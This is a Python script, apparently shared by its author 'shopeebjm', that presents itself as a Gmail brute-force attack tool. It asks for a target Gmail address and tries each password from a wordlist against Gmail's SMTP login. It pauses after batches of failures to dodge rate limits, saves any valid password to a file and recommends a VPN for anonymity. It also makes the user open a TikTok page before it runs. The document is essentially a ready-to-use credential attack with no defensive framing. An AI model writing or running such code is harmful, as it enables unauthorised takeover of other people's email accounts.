#!/usr/bin/env python3
import os
import sys
import time
import smtplib

# Clear the terminal
os.system("clear")

# Animation function for smooth text display
def animate(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.008)

# SMTP setup function
def StartSMTPServiceForGmail():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    return smtpserver

# Main brute force function
def StartBruteAccount(Passlist, account, SMTPServer, Count, _Count, Time):
    try:
        with open(Passlist, 'r') as PasswordsFile:
            for Password in PasswordsFile:
                Password = Password.rstrip("\n")
                try:
                    SMTPServer.login(account, Password)
                    print(f"\n\033[1;32m[+] Valid Password Found: {Password}, For: {account}\033[0m")
                    
                    # Save successful credentials
                    with open('credits.txt', 'a') as DataFile:
                        DataFile.write("\n--------------------------------------->")
                        DataFile.write(f"[+] Email: {account}\n")
                        DataFile.write(f"[+] Password: {Password}\n")
                        DataFile.write("--------------------------------------->\n")
                        DataFile.close()
                    exit()
                except smtplib.SMTPAuthenticationError:
                    Count += 1
                    _Count += 1
                    if Count == 20:
                        print(f"\n\033[1;33m[!] Sleeping for {Time} seconds...\033[0m")
                        time.sleep(int(Time))
                        Count = 0
                        SMTPServer.close()
                        SMTPServer = StartSMTPServiceForGmail()
                    else:
                        print(f"\n\033[1;31m[-] Bad Password: {Password}   \033[0m", end="")
                        #sys.stdout.flush()
                except Exception as e:
                    if "please run connect() first" in str(e):
                        SMTPServer.close()
                        print("\n\033[1;31mThe SMTP Server Disconnected. Please try again after changing your IP or waiting a while.\033[0m")
                        exit()
                    else:
                        print(f"\033[1;31mError: {e}\033[0m")
    except FileNotFoundError:
        print(f"\033[1;31mError: Password file '{Passlist}' not found. Exiting...\033[0m")
        exit()

# ASCII art for welcome screen
banner = '''\033[1;32m

                           ██╗  ██╗ ██████╗ ██████╗
                           ██║  ██║██╔════╝██╔═══██╗
                           ███████║██║     ██║   ██║
                           ██╔══██║██║     ██║   ██║
                           ██║  ██║╚██████╗╚██████╔╝
                           ╚═╝  ╚═╝ ╚═════╝ ╚═════╝

\033[1;33m

               
                   ██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗
                   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝╚██╗██╔╝
                   ██████╔╝██████╔╝██║   ██║   ██║    ╚███╔╝ 
                   ██╔══██╗██╔══██╗██║   ██║   ██║    ██╔██╗ 
                   ██████╔╝██║  ██║╚██████╔╝   ██║   ██╔╝ ██╗
                   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                          



\033[1;31m                     :: BrutXGmail - By shopeebjm ::
\033[0m
'''
animate(banner)

# Disclaimer
notice = ("\n\033[1;34mini Adalah Tools Gratis Untuk Itu Silahkan Follow Dulu.\n"
         "Saya Akan Mengarahkan Ke Akun TikTok.\n"
         "Follow Dulu Agar Tools Ini Dapat Digunakan.\033[0m\n")
animate(notice)
time.sleep(5)
os.system("xdg-open https://tiktok.com/@shopee.bjm")
time.sleep(7)

# Clear terminal before showing program logo
os.system("clear")

logo = '''\033[1;32m

                 /$$$$$$$                        /$$     /$$   /$$
                | $$__  $$                      | $$    | $$  / $$
                | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$  |  $$/ $$/
                | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   \  $$$$/ 
                | $$__  $$| $$  \__/| $$  | $$  | $$      >$$  $$ 
                | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$/\  $$
                | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/| $$  \ $$
                |_______/ |__/       \______/    \___/  |__/  |__/                                                       


                    /$$$$$$                          /$$ /$$
                   /$$__  $$                        |__/| $$
                  | $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$| $$
                  | $$ /$$$$| $$_  $$_  $$ |____  $$| $$| $$
                  | $$|_  $$| $$ \ $$ \ $$  /$$$$$$$| $$| $$
                  | $$  \ $$| $$ | $$ | $$ /$$__  $$| $$| $$
                  |  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$| $$
                   \______/ |__/ |__/ |__/ \_______/|__/|__/
                             
                                                                            
          
                  \033[1;34m     .:shopeebjm:.

                       __Gmail BruteForce Attack Tool__

'''
animate(logo)

# Instructions
dictr = "\033[1;32m\n[+] Pastikan daftar kata berada di direktori yang sama dengan skrip ini.\n"
vpnu = "[+] Gunakan VPN untuk anonimitas yang lebih baik.\n\033[0m\n\n"
animate(dictr)
animate(vpnu)

try:
    # SMTP Initialization
    smtpserver = StartSMTPServiceForGmail()

    # User inputs
    user = input("\033[1;36mEnter target Gmail ID: \033[0m")

    # Wordlist selection
    print("\033[1;36m\nChoose a wordlist:\033[0m")
    print("\n\033[1;31m1. Your Wordlist")
    print("\033[1;31m2. HCO Wordlist\033[0m")
    choice = input("\n\033[1;36mEnter your choice (1 or 2): \033[0m")

    if choice == "1":
        passwf_path = input("\n\033[1;36mEnter path to your custom wordlist: \033[0m")
    elif choice == "2":
        passwf_path = "hcowordlist.txt"
        print("\n\033[1;33mUsing HCO wordlist: 'hcowordlist.txt'\033[0m")
    else:
        print("\n\033[1;31mInvalid choice. Exiting...\033[0m")
        exit()

    # Start brute force attack
    StartBruteAccount(passwf_path, user, smtpserver, 0, 0, 30)

except KeyboardInterrupt:
    print("\n\n\033[1;31m[!] Program interrupted by the user. \n\nExiting...\033[0m")
except Exception as smtp_error:
    print(f"\n\033[1;31mError: {smtp_error}\033[0m")
